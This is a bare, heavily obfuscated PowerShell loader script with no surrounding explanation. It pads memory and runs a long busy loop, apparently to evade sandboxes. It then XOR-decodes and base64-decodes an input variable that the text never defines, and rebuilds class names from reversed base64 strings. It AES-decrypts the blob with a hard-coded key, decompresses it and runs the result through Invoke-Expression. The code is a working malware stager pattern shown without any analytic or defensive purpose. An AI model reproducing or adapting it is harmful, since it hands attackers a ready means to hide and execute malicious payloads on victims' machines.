$yxovwjqmqygpx = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($yxovwjqmqygpx -lt 250) { $hwvwoqqxokopu = "a" * 300MB }
$shzssninrhqgikmkq = 0
$hwkmzuzjnsgzom = 30000000
For ($shzssninrhqgikmkq=0; $shzssninrhqgikmkq -lt $hwkmzuzjnsgzom;$shzssninrhqgikmkq++) { $shzssninrhqgikmkq++ }
$romrjqyyuuvwqyrzn = [System.Text.Encoding]::UTF8.GetBytes("zysywktvzih")
$tsrquhqiwj = [System.Text.Encoding]::UTF8.GetBytes($myuztoxqovqtjqzwi)
$omuttipkhvqkg = $(for ($ovrsjsgwzxgo = 0; $ovrsjsgwzxgo -lt $tsrquhqiwj.length; ) {
    for ($rrrkykkzppxxrvt = 0; $rrrkykkzppxxrvt -lt $romrjqyyuuvwqyrzn.length; $rrrkykkzppxxrvt++) {
        $tsrquhqiwj[$ovrsjsgwzxgo] -bxor $romrjqyyuuvwqyrzn[$rrrkykkzppxxrvt]
        $ovrsjsgwzxgo++
        if ($ovrsjsgwzxgo -ge $tsrquhqiwj.Length) {
            $rrrkykkzppxxrvt = $romrjqyyuuvwqyrzn.length
        }
    }
})
$omuttipkhvqkg = [System.Text.Encoding]::UTF8.GetString($omuttipkhvqkg)
$ivqszwoimht = "$omuttipkhvqkg"
$onzmqnunhgru = $ivqszwoimht.ToCharArray()
[array]::Reverse($onzmqnunhgru)
$ohqjsqwpvmj = -join($onzmqnunhgru)
$ouuzqizmohxtsz = [System.Convert]::FromBase64String("$ohqjsqwpvmj")
$unusjiqjjqxq = [System.Convert]::FromBase64String("4bSTlJoRTDJE9PH3EuEFBZh+3Enngsy8ZygLhoEceU0=")
$zojtkxqjnixyowzj = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$kpnjxysvhk = $zojtkxqjnixyowzj.ToCharArray()
[array]::Reverse($kpnjxysvhk)
$oiqithhuskuh = -join($kpnjxysvhk)
$rphzkuswixxogisr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($oiqithhuskuh))
$ipjqnnyhghowiuh = New-Object "$rphzkuswixxogisr"
$xzkqrktiqpqtp = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$tntnqikpjzhruiy = $xzkqrktiqpqtp.ToCharArray()
[array]::Reverse($tntnqikpjzhruiy)
$mjyohqrvptogyh = -join($tntnqikpjzhruiy)
$qiynokikqtjhizrjz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mjyohqrvptogyh))
$prhonmqjmjumyrouz = & ([scriptblock]::Create($qiynokikqtjhizrjz))
$ipjqnnyhghowiuh.Mode = $prhonmqjmjumyrouz
$gzrikhksnrpxhiqyy = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$hpyhjjnizkogyx = $gzrikhksnrpxhiqyy.ToCharArray()
[array]::Reverse($hpyhjjnizkogyx)
$xjjqqijyumg = -join($hpyhjjnizkogyx)
$vxjrqzrgxjqnjoow = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($xjjqqijyumg))
$qsoonzjopgioxuoz = & ([scriptblock]::Create($vxjrqzrgxjqnjoow))
$ipjqnnyhghowiuh.Padding = $qsoonzjopgioxuoz
$ipjqnnyhghowiuh.BlockSize = 128
$ipjqnnyhghowiuh.KeySize = 192
$ipjqnnyhghowiuh.Key = $unusjiqjjqxq
$ipjqnnyhghowiuh.IV = $ouuzqizmohxtsz[0..15]
$tisyygzxhz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$hxkpjqmhjzkx = New-Object $tisyygzxhz(,$ipjqnnyhghowiuh.CreateDecryptor().TransformFinalBlock($ouuzqizmohxtsz,16,$ouuzqizmohxtsz.Length-16))
$tpyyotsrnv = New-Object $tisyygzxhz
$qkyqhsvyvih = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$xykhymkwijqotpovk = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$phwwrtikzzjvzjxz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$zvrutsurssvp = New-Object $phwwrtikzzjvzjxz $hxkpjqmhjzkx, ($xykhymkwijqotpovk::$qkyqhsvyvih)
$zvrutsurssvp.CopyTo($tpyyotsrnv)
$zvrutsurssvp.Close()
$ipjqnnyhghowiuh.Dispose()
$hxkpjqmhjzkx.Close()
$xupvtoqhugzsxz = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$tyrpgwjrwqjpg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$uyyosrhmwuy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$ztpnurzmkqqjnoh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$wpuhjqwqqmsomo = $xupvtoqhugzsxz::$tyrpgwjrwqjpg.$ztpnurzmkqqjnoh($tpyyotsrnv.$uyyosrhmwuy())
Invoke-Expression($wpuhjqwqqmsomo)